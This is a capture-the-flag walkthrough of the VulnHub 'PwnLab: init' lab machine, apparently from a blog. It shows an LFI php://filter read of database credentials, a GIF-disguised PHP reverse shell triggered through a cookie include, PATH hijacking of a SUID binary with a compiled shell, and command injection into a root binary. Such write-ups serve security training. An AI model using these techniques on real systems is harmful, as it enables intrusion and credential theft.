# VulnHub - PwnLab: init

Let's first locate the VM on the network:

```
# nmap -sn 192.168.56.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-26 16:07 UTC
...
Nmap scan report for 192.168.56.114
Host is up.
...
```

And then check it's open TCP ports:

```
# nmap -p- 192.168.56.114
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-26 16:08 UTC
Nmap scan report for 192.168.56.114
Host is up (0.00027s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
3306/tcp  open  mysql
42747/tcp open  unknown
```

Based on the ports, we run nmap version detection and script scanning along with nikto while manually inspecting port 80. The website is simple with a home page with links to login form and upload. The upload is restricted to users only. Not fond of bruteforcing credentials, but since it is sometimes the intended solution, bruteforce was issued on the login form with classic usernames (user, admin) and top 12000 password list.

As tools were running and the web was inspected, a weird URL param emerged:

```
http://192.168.56.114/?page=upload
```

Went first by trying simple LFI stuff such as `/etc/passwd` or `../../../../etc/passwd`, `php://expect`, etc. Thinking about the URL parameter - if there is a LFI vulnerability, file extension is appended to the parameter in code. The following input worked:

```
http://192.168.56.114/?page=php://filter/convert.base64-encode/resource=upload
```

Just in time, nikto results showed:

```
+ /config.php: PHP Config file may contain database IDs and passwords.
```

So this step was crucial:

`http://192.168.56.114/?page=php://filter/convert.base64-encode/resource=config`

Which gives the base64 output of `config.php` file on the web page:

```
# echo "PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8" | base64 -d
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

Since we got the MySQL credentials, we connect to it as a next step:

```
# mysql -h 192.168.56.114 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 39
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> use Users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.006 sec)

MySQL [Users]> Ctrl-C -- exit!
Aborted

```

The user `kent` with password `JWzXuBJJNy` worked like a charm on the web page login form. Now let's move on to the upload. I tried some simple stuff like uploading a plain PHP script which did not work, tried faking both the content type and magic bytes but this did not execute our PHP script. To make the exploitation easier we download the `upload.php` source code the same way as `config.php`.

```
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>
```

The `upload.php` source file showed no issues at first sight. The checks that were implemented were good enough to remove the ability to execute any PHP script we upload. To bypass all checks `php-reverse-shell.php` was used that was modified with a `.gif` extension and had `GIF89a` as first six bytes in the file. Since there was no way to execute the script that was uploaded, `index.php` was checked for its source whether there are any issues.

```
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>
```

Bingo. The `include("lang/".$_COOKIE['lang']);` can be used to execute our PHP script by providing the file path to our `php-reverse-shell.gif` in the cookie under the `lang` key. Let's start the nc listener and reupload our script as `.gif`. In HTML response we see the following tag: `<img src="upload/8513fa03f53699c754ad7f940efa8efd.gif">` and set the cookie in the browser to `lang=../upload/8513fa03f53699c754ad7f940efa8efd.gif`. Another request to the web page and the terminal pops:

```
# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.114] 45621
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 20:00:07 up  2:36,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

We got limited www-data shell. Next step is a quick and dirty interactive reverse shell via python, afterwards tried `su kent` with a known password which worked. At this point I spent half an hour searching how to escalate privileges and saw nothing useful. Out of ideas and hoping that there will be something in other user's home directories, I tried `mike` as user with his password which didn't work. Next I tried `kane` as user with a known password and `kane` worked. I noticed this in the `/home/kane` dir:

```
$ ls -al /home/kane
ls -al /home/kane
total 96
drwxr-x--- 2 kane kane  4096 Jun 26 19:24 .
drwxr-xr-x 6 root root  4096 Mar 17  2016 ..
-rw-r--r-- 1 kane kane   220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 kane kane  3515 Mar 17  2016 .bashrc
-rwsr-sr-x 1 mike mike  5148 Mar 17  2016 msgmike
-rw-r--r-- 1 kane kane   675 Mar 17  2016 .profile
```

SUID binary msgmike. Pulled the binary from the server and reversed it:

```
# r2 -AAAA msgmike
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x08048360]> pdf @ sym.main
            ;-- main:
/ (fcn) sym.main 83
|   sym.main (int argc, char **argv, char **envp);
|           ; var int local_4h @ ebp-0x4
|           ; arg int arg_4h @ esp+0x4
|           ; DATA XREF from entry0 (0x8048377)
|           0x0804845b      8d4c2404       lea ecx, dword [arg_4h]     ; 4
|           0x0804845f      83e4f0         and esp, 0xfffffff0
|           0x08048462      ff71fc         push dword [ecx - 4]
|           0x08048465      55             push ebp
|           0x08048466      89e5           mov ebp, esp
|           0x08048468      51             push ecx
|           0x08048469      83ec04         sub esp, 4
|           0x0804846c      83ec08         sub esp, 8
|           0x0804846f      68ea030000     push 0x3ea                  ; 1002
|           0x08048474      68ea030000     push 0x3ea                  ; 1002
|           0x08048479      e8b2feffff     call sym.imp.setreuid
|           0x0804847e      83c410         add esp, 0x10
|           0x08048481      83ec08         sub esp, 8
|           0x08048484      68ea030000     push 0x3ea                  ; 1002
|           0x08048489      68ea030000     push 0x3ea                  ; 1002
|           0x0804848e      e8bdfeffff     call sym.imp.setregid
|           0x08048493      83c410         add esp, 0x10
|           0x08048496      83ec0c         sub esp, 0xc
|           0x08048499      6840850408     push str.cat__home_mike_msg.txt ; 0x8048540 ; "cat /home/mike/msg.txt"
|           0x0804849e      e86dfeffff     call sym.imp.system         ; int system(const char *string)
|           0x080484a3      83c410         add esp, 0x10
|           0x080484a6      8b4dfc         mov ecx, dword [local_4h]
|           0x080484a9      c9             leave
|           0x080484aa      8d61fc         lea esp, dword [ecx - 4]
\           0x080484ad      c3             ret
```

The binary called `cat /home/mike/msg.txt` so what we can do is:
1. create own code that spawns a shell
2. compile the code and name the binary `cat`
3. upload to server
4. adjust server `PATH` variable so that `/home/kane` comes first and our `cat` binary is executed

Let's begin with source code:

```
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>

int main() {
	setuid(geteuid());
	system("/bin/bash");
	return 0;
}
```

Compile with `gcc -m32 -o cat shell.c`, upload to the server and adjust `PATH`:

```
kane@pwnlab:/$ wget 192.168.56.101:8000/cat
kane@pwnlab:/$ ls /home/kane
ls /home/kane
cat  msgmike
kane@pwnlab:/$ export PATH=/home/kane:$PATH
export PATH=/home/kane:$PATH
kane@pwnlab:/$ echo $PATH
echo $PATH
/home/kane:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
kane@pwnlab:/$ which cat
which cat
/home/kane/cat
kane@pwnlab:/$ /home/kane/msgmike
/home/kane/msgmike
mike@pwnlab:/$ 
```

We got access as user `mike`, let's check his home directory:

```
mike@pwnlab:/$ ls -al /home/mike
ls -al /home/mike
total 44
drwxr-x--- 2 mike mike  4096 Jun 26 19:35 .
drwxr-xr-x 6 root root  4096 Mar 17  2016 ..
-rw-r--r-- 1 mike mike   220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 mike mike  3515 Mar 17  2016 .bashrc
-rwsr-sr-x 1 root root  5364 Mar 17  2016 msg2root
-rw-r--r-- 1 mike mike   675 Mar 17  2016 .profile
```

There is again a SUID binary owned by root, we pull it and reverse again:

```
# r2 -AAAA msg2root
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x080483b0]> pdf @ sym.main
            ;-- main:
/ (fcn) sym.main 103
|   sym.main (int argc, char **argv, char **envp);
|           ; var int local_70h @ ebp-0x70
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ ebp-0x4
|           ; arg int arg_4h @ esp+0x4
|           ; DATA XREF from entry0 (0x80483c7)
|           0x080484ab      8d4c2404       lea ecx, dword [arg_4h]     ; 4
|           0x080484af      83e4f0         and esp, 0xfffffff0
|           0x080484b2      ff71fc         push dword [ecx - 4]
|           0x080484b5      55             push ebp
|           0x080484b6      89e5           mov ebp, esp
|           0x080484b8      51             push ecx
|           0x080484b9      83ec74         sub esp, 0x74               ; 't'
|           0x080484bc      83ec0c         sub esp, 0xc
|           0x080484bf      68b0850408     push str.Message_for_root:  ; 0x80485b0 ; "Message for root: "
|           0x080484c4      e887feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080484c9      83c410         add esp, 0x10
|           0x080484cc      a1f4970408     mov eax, dword [obj.stdin__GLIBC_2.0] ; obj.__TMC_END ; [0x80497f4:4]=0
|           0x080484d1      83ec04         sub esp, 4
|           0x080484d4      50             push eax
|           0x080484d5      6a64           push 0x64                   ; 'd' ; 100
|           0x080484d7      8d4590         lea eax, dword [local_70h]
|           0x080484da      50             push eax
|           0x080484db      e880feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x080484e0      83c410         add esp, 0x10
|           0x080484e3      83ec04         sub esp, 4
|           0x080484e6      8d4590         lea eax, dword [local_70h]
|           0x080484e9      50             push eax
|           0x080484ea      68c4850408     push str.bin_echo__s_____root_messages.txt ; 0x80485c4 ; "/bin/echo %s >> /root/messages.txt"
|           0x080484ef      8d45f4         lea eax, dword [local_ch]
|           0x080484f2      50             push eax
|           0x080484f3      e8a8feffff     call sym.imp.asprintf
|           0x080484f8      83c410         add esp, 0x10
|           0x080484fb      8b45f4         mov eax, dword [local_ch]
|           0x080484fe      83ec0c         sub esp, 0xc
|           0x08048501      50             push eax
|           0x08048502      e869feffff     call sym.imp.system         ; int system(const char *string)
|           0x08048507      83c410         add esp, 0x10
|           0x0804850a      8b4dfc         mov ecx, dword [local_4h]
|           0x0804850d      c9             leave
|           0x0804850e      8d61fc         lea esp, dword [ecx - 4]
\           0x08048511      c3             ret
```

The command "/bin/echo %s >> /root/messages.txt" which is executed has a command injection vulnerability so we simply run the binary and input `a; /bin/cat /root/flag.txt` to get the flag:

```
mike@pwnlab:/$ /home/mike/msg2root
/home/mike/msg2root
Message for root: a; /bin/cat /root/flag.txt
a; /bin/cat /root/flag.txt
a
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
mike@pwnlab:/$ 
```
